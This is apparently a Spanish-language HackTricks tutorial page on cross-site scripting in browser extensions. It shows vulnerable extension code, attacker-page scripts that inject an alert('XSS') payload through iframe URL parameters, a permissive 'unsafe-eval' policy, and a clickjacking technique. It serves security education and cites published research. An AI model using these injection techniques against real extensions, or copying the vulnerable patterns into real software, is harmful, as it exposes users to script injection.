# BrowExt - Ejemplo de XSS

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## XSS en Iframe

**Content script** crea un Iframe indicando una **URL en los par√°metros de la fuente del iFrame**:
```javascript
chrome.storage.local.get("message", result =>
{
frame.src = chrome.runtime.getURL("message.html") +
"?message=" + encodeURIComponent(result.message) +
"&url=https://example.net/explanation";
});
```
Una p√°gina html expuesta: **`message.html`**, accesible desde el **navegador**, contiene un c√≥digo como:
```java
$(() =>
{
let params = new URLSearchParams(location.search);
$(document.body).append(params.get("message") + " <button>Explain</button>");
$("body > button").click(() =>
{
chrome.tabs.create({ url: params.get("url") });
});
});
```
La p√°gina maliciosa ejecuta un script como el siguiente para cambiar el mensaje por un **XSS payload**:
```javascript
setTimeout(() =>
{
let frame = document.querySelector("iframe:last-child");
let src = frame.src;

// Remove existing query parameters
src = src.replace(/\?.*/, "");

// Add malicious query parameters
src += "?message=" + encodeURIComponent("<script>alert('XSS')</script>");

// Load into frame
frame.src = src;
}, 1000);
```
Una pol√≠tica de seguridad de contenido permisiva como&#x20;
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
permitir√° la ejecuci√≥n del c√≥digo JS.

Otra forma de activar el XSS a voluntad es ejecutando:
```javascript
let frame = document.createElement("iframe");
frame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?message="
+ encodeURIComponent("<script>alert('XSS')</script>");
document.body.appendChild(frame);
```
## XSS basado en DOM + ClickJacking

La primera vulnerabilidad es la vulnerabilidad de Cross-site Scripting (XSS) basada en DOM en **`/html/bookmarks.html`**, a continuaci√≥n se muestra el JavaScript vulnerable incluido en **`bookmarks.js`**:
```javascript
$('#btAdd').click(function() {
var btname = $('#txtName').val();
if ($('.custom-button .name').filter(function() {
return $(this).text() === btname;
}).length) return false;

var span = $('<span class="custom-button">');
span.html('<span class="name">' + btname + '</span>');
span.append('<a href="javascript:void(0)" title="remove">x</a>');
span.attr('title', btname);
span.data('id', (new Date().getTime()));
$('div.custom-buttons .existing').append(span);
save_options();
});
```
El JavaScript anterior toma el **valor** del cuadro de texto **`txtName`** y utiliza **concatenaci√≥n de cadenas para construir HTML** que se agrega al DOM a trav√©s de la funci√≥n [‚Äúappend()‚Äù](https://api.jquery.com/append/) de jQuery.

Normalmente, la Pol√≠tica de Seguridad de Contenido (CSP) de las extensiones de Chrome deber√≠a prevenir que esta vulnerabilidad sea explotada. Sin embargo, debido a la **relajaci√≥n de esta pol√≠tica a trav√©s de** [**‚Äòunsafe-eval‚Äô**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) y el uso de las APIs DOM de jQuery, a√∫n fue posible **explotarla**. Esto se debe a que muchas de las APIs DOM de jQuery hacen uso de [‚ÄúglobalEval()‚Äù](https://api.jquery.com/jquery.globaleval/), que autom√°ticamente pasa scripts a [‚Äúeval()‚Äù](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) al ser agregados al DOM.

Aunque esta es una vulnerabilidad grave, por s√≠ sola la explotaci√≥n es bastante limitada debido a la **interacci√≥n del usuario requerida para explotarla**. La v√≠ctima tendr√≠a que abrir la p√°gina, pegar un payload de Cross-site Scripting (XSS) en el campo y hacer clic en el bot√≥n "Add" para explotarla.

Para mejorar la explotaci√≥n de esta vulnerabilidad hacemos uso de una vulnerabilidad separada (**clickjacking**) para reforzar el ataque.

El siguiente es un extracto del manifiesto de la extensi√≥n de Chrome:
```json
...trimmed for brevity...
"web_accessible_resources": [
"_locales/*",
"bundle/*",
"dist/*",
"assets/*",
"font/*",
"html/bookmarks.html",
"css/*.css",
"js/*.js",
"js/jquery/*.js",
"js/lang/*"
],
...trimmed for brevity...
```
La secci√≥n anterior demuestra que la extensi√≥n abarca mucho con su pol√≠tica de **`web_accessible_resources`**.

La p√°gina **`/html/bookmarks.html`** tambi√©n puede ser **enmarcada** y por lo tanto **explotada** a trav√©s de **clickjacking**. Abusamos de esto para enmarcar esta p√°gina en nuestra p√°gina web y **superponer el marco con elementos DOM para redise√±ar el layout**. Esto hace que la v√≠ctima no sea consciente de que est√° **interactuando realmente con la extensi√≥n debajo**. La siguiente animaci√≥n demuestra este efecto (verifique la animaci√≥n en el [**art√≠culo original**](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)).

## Referencias

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
